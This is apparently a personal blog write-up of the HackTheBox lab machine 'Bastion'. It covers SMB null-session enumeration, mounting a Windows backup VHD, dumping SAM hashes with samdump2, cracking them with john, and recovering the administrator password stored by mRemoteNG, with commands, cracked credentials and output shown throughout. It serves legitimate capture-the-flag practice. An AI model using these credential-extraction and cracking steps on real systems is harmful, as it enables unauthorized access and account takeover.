+++
title = "HTB Write-up: Bastion"
date = "2019-09-08T12:40:00+02:00"
description = "Bastion just retired this weekend on HackTheBox.eu so I thought I would do a short write-up of what I learned during this Windows box."
draft = false
toc = false
categories = ["post"]
tags = ["htb", "ctf", "windows", "smb", "nRemoteNG", "john"]
images = [
  "https://0xrick.github.io/images/hackthebox/bastion/0.png"
] # overrides site-wide open graph image

+++

The Bastion Windows box retired this weekend on {{< external href="https://www.hackthebox.eu/" text="HackTheBox" />}}. It was a Windows box, quite easy to solve but learned a lot along the way. It's my first write-up of a HTB box so it might not be the best but hopefully it will be a nice summary! We learn about SMB, mounting VHD in Linux, stealing Windows hashes, cracking them with John, and exploiting a program for Privesc.

![Bastion badge](/bastion.png)

## 1: Recon

First, I do the usual nmap scan I start with on all boxes:
{{< hackcss-alert type="info" >}}
nmap -A -oN nmap-bastion.txt 10.10.10.134<br>
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-20 08:43 GMT<br>
Nmap scan report for 10.10.10.134<br>
Host is up (0.34s latency).<br>
Not shown: 996 closed ports<br>
PORT    STATE SERVICE      VERSION<br>
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)<br>
| ssh-hostkey: <br>
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)<br>
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)<br>
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)<br>
135/tcp open  msrpc        Microsoft Windows RPC<br>
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn<br>
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds<br>
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows<br>
<br>
Host script results:<br>
|_clock-skew: mean: -40m01s, deviation: 1h09m15s, median: -2s<br>
| smb-os-discovery: <br>
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)<br>
|   Computer name: Bastion<br>
|   NetBIOS computer name: BASTION\x00<br>
|   Workgroup: WORKGROUP\x00<br>
|_  System time: 2019-07-20T10:43:23+02:00<br>
| smb-security-mode: <br>
|   account_used: guest<br>
|   authentication_level: user<br>
|   challenge_response: supported<br>
|_  message_signing: disabled (dangerous, but default)<br>
| smb2-security-mode: <br>
|   2.02: <br>
|_    Message signing enabled but not required<br>
| smb2-time: <br>
|   date: 2019-07-20 08:43:22<br>
|_  start_date: 2019-07-20 02:31:48
{{< /hackcss-alert >}}

The open ports are not too exciting but we've got SMB, so let's see if we can exploit it.
{{< hackcss-alert type="info" >}}
root@kali:~/Desktop/HTB/Bastion# smbclient -L //10.10.10.134<br>
Enter WORKGROUP\Root's password: <br>
<br>
	Sharename       Type      Comment<br>
	---------       ----      -------<br>
	ADMIN$          Disk      Remote Admin<br>
	Backups         Disk      <br>
	C$              Disk      Default share<br>
	IPC$            IPC       Remote IPC<br>
Reconnecting with SMB1 for workgroup listing.<br>
do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>
Failed to connect with SMB1 -- no workgroup available
{{< /hackcss-alert >}}

Alright, now we can access Backups by using Null session:
{{< hackcss-alert type="info" >}}
root@kali:~/Desktop/HTB/Bastion# smbclient //10.10.10.134/backups<br>
Enter WORKGROUP\'s password:<br>
Try "help" to get a list of possible commands.<br>
smb: \> l<br>
  .                                   D        0  Fri Sep  6 13:39:45 2019<br>
  ..                                  D        0  Fri Sep  6 13:39:45 2019<br>
  note.txt                           AR      116  Tue Apr 16 12:10:09 2019<br>
  pFESbxwaWT                          D        0  Fri Sep  6 13:39:45 2019<br>
  SDT65CB.tmp                         A        0  Fri Feb 22 14:43:08 2019<br>
  WindowsImageBackup                  D        0  Fri Feb 22 14:44:02 2019<br>
<br>
                7735807 blocks of size 4096. 2759330 blocks available
{{< /hackcss-alert >}}

I found note.txt but nothing interesting there. But there is a directory called WindowsImageBackup!

<br>
## 2: Mounting the VHD to get user

In the WindowsImageBackup we find 2 VHD files:
{{< hackcss-alert type="info" >}}
9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd      A 37761024  Fri Feb 22 14:44:03 2019<br>
9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd      A 5418299392  Fri Feb 22 14:45:32 2019
{{< /hackcss-alert >}}

They are big files so we want to avoid downloading them. After a LOT of googling and every more failed attempts, I found the way to mount VHD files in linux. First I needed to install {{< external href="https://www.varonis.com/blog/cifs-vs-smb/" text="CIFS" />}}:
{{< hackcss-alert type="info" >}}
root@kali:~/Desktop/HTB/Bastion# sudo apt-get install cifs-utils<br>
{{< /hackcss-alert >}}

The first and smaller VHD didn't contain anything of interest so let's go straight to the second one:
{{< hackcss-alert type="info" >}}
root@kali:~/Desktop/HTB/Bastion# mount.cifs //10.10.10.134/Backups ./mount<br>
root@kali:~/Desktop/HTB/Bastion# guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --ro ~/Desktop/HackTheBox/Bastion/vhd-mount2 -m /dev/sda1
{{< /hackcss-alert >}}

Wait a few seconds and the VHD should appear as a mounted folder in your system now! I checked the Users folder but nothing there which means there is another step to getting user.txt. After getting back to more googling, I found some info about extracting the hashes in a Windows backup in /System32/config by using {{< external href="https://linux.die.net/man/1/samdump2" text="samdump2" />}}:
{{< hackcss-alert type="info" >}}
samdump2 SYSTEM SAM<br>
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
{{< /hackcss-alert >}}

I saved the hash in a txt file to crack it with john:
{{< hackcss-alert type="info" >}}
root@kali:~/Desktop/HTB/Bastion# john --format=NT --rules -w=/usr/share/wordlists/rockyou.txt hash.txt<br>
Using default input encoding: UTF-8<br>
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])<br>
Warning: no OpenMP support for this hash type, consider --fork=3<br>
Press 'q' or Ctrl-C to abort, almost any other key for status<br>
bureaulampje     (L4mpje)<br>
1g 0:00:00:05 DONE (2019-07-20 12:55) 0.1709g/s 1606Kp/s 1606Kc/s 1606KC/s burg772v..burdy1<br>
Use the "--show --format=NT" options to display all of the cracked passwords reliably<br>
Session completed
{{< /hackcss-alert >}}

Awesome I got the password "bureaulampje"! I know SSH is available on this box from the nmap scan:
{{< hackcss-alert type="info" >}}
root@kali:~/Desktop/HTB/Bastion# ssh L4mpje@10.10.10.134
{{< /hackcss-alert >}}

And I find the user.txt on the Desktop of the machine!

<br>
## 3: Priviledge Escalation

I did a lot of enumeration suggested on different Windows privesc guides, and finally found a weird program sitting in Program Files called nRemoteNG. A quick google search shows that it is vulnerable and can get us admin password: http://hackersvanguard.com/mremoteng-insecure-password-storage/

I download nRemoteNG on my Windows VM. I used {{< external href="https://winscp.net/eng/index.php" text="WinSCP" />}} to access C:\Users\L4mpje\AppData\Roaming\mRemoteNG and download consConf.xml on my VM. Then I import it on nRemoteNG and to see the clear text of a given password, go to “Tools” > “External Tools”. Then right-click in the white space and choose “New External Tool”. Next, in the External Tools Properties, fill in a “Display Name”, “Filename” and some “arguments”, with “Password lookup”, CMD and “/k echo %password%” respectively.

![nRemoteNG screenshot](/nremoteng.png)

Then right click on the Bastion connection, external tool, Password Lookup, and we get the Admin password. We can now SSH with Administrator and get the root flag!
{{< hackcss-alert type="info" >}}
root@kali:~/Desktop/HTB/Bastion# ssh Administrator@10.10.10.134<br>
{{< /hackcss-alert >}}

![Master hacker gif](/masterhack.gif)
